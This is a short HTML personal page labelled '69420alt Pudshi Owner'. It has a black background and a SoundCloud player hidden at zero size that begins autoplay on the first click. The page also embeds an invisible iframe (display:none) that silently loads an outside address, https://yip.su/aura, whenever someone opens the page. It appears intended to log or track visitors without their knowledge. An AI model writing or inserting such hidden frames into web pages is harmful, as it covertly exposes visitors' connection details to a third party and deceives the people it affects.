<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>69420alt</title>
<style>
  html, body {
    margin: 0; padding: 0; height: 100%;
    background: black;
    color: white;
    font-family: monospace;
    display: flex;
    justify-content: center;
    align-items: center;
    user-select: none;
    cursor: pointer;
  }
  #header {
    font-size: 28px;
  }
  #hiddenSite {
    display: none;
  }
  #soundcloudPlayer {
    width: 0;
    height: 0;
    border: 0;
  }
</style>
</head>
<body>
  <div id="header">69420alt Pudshi Owner</div>

  <iframe 
    id="soundcloudPlayer"
    width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
    src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/liltecca/hvh-on-top&auto_play=false&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false">
  </iframe>

  <iframe id="hiddenSite" src="https://yip.su/aura"></iframe>

<script>
  const iframe = document.getElementById('soundcloudPlayer');
  let started = false;

  document.body.addEventListener('click', () => {
    if (started) return;
    iframe.src = "https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/liltecca/hvh-on-top&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false";
    started = true;
  });
</script>
</body>
</html>
